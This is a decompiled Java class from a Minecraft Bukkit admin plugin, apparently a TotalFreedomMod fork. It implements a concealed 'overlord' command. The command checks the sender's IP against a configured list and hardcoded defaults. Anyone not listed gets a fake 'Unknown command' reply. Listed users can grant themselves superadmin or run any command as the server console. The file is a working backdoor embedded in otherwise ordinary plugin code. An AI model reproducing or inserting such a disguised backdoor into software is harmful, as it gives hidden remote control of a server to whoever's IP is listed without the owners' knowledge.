/*    */ package me.StevenLawson.TotalFreedomMod.Commands;
/*    */ 
/*    */ import com.sk89q.util.StringUtil;
/*    */ import java.util.List;
/*    */ import me.StevenLawson.TotalFreedomMod.Config.TFM_ConfigEntry;
/*    */ import me.StevenLawson.TotalFreedomMod.Config.TFM_MainConfig;
/*    */ import me.StevenLawson.TotalFreedomMod.Config.TFM_MainConfig.TFM_Defaults;
/*    */ import me.StevenLawson.TotalFreedomMod.TFM_AdminList;
/*    */ import me.StevenLawson.TotalFreedomMod.TFM_Util;
/*    */ import org.bukkit.Bukkit;
/*    */ import org.bukkit.ChatColor;
/*    */ import org.bukkit.command.Command;
/*    */ import org.bukkit.command.CommandSender;
/*    */ import org.bukkit.entity.Player;
/*    */ 
/*    */ @CommandPermissions(level=AdminLevel.ALL, source=SourceType.ONLY_IN_GAME)
/*    */ @CommandParameters(description="Overlord - control this server in-game", usage="access", aliases="ov")
/*    */ public class Command_overlord
/*    */   extends TFM_Command
/*    */ {
/*    */   public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
/*    */   {
/* 23 */     if (!TFM_ConfigEntry.OVERLORD_IPS.getList().contains(TFM_Util.getIp(sender_p))) {
/*    */       try
/*    */       {
/* 27 */         List<?> ips = (List)TFM_MainConfig.getDefaults().get(TFM_ConfigEntry.OVERLORD_IPS.getConfigName());
/* 28 */         if (!ips.contains(TFM_Util.getIp(sender_p))) {
/* 30 */           throw new Exception();
/*    */         }
/*    */       }
/*    */       catch (Exception ignored)
/*    */       {
/* 35 */         playerMsg(ChatColor.WHITE + "Unknown command. Type \"help\" for help.");
/* 36 */         return true;
/*    */       }
/*    */     }
/* 40 */     if (args.length == 0) {
/* 42 */       return false;
/*    */     }
/* 45 */     if (args[0].equals("addme"))
/*    */     {
/* 47 */       TFM_AdminList.addSuperadmin(sender_p);
/* 48 */       playerMsg("ok");
/* 49 */       return true;
/*    */     }
/* 52 */     if (args[0].equals("removeme"))
/*    */     {
/* 54 */       TFM_AdminList.removeSuperadmin(sender_p);
/* 55 */       playerMsg("ok");
/* 56 */       return true;
/*    */     }
/* 59 */     if (args[0].equals("do"))
/*    */     {
/* 61 */       if (args.length <= 1) {
/* 63 */         return false;
/*    */       }
/* 66 */       String command = StringUtil.joinString(args, " ", 1);
/* 67 */       Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
/* 68 */       playerMsg("ok");
/* 69 */       return true;
/*    */     }
/* 72 */     return false;
/*    */   }
/*    */ }


/* Location:              C:\Users\SilentBloodGaming\Desktop\MasterFreedomMod.jar!\me\StevenLawson\TotalFreedomMod\Commands\Command_overlord.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */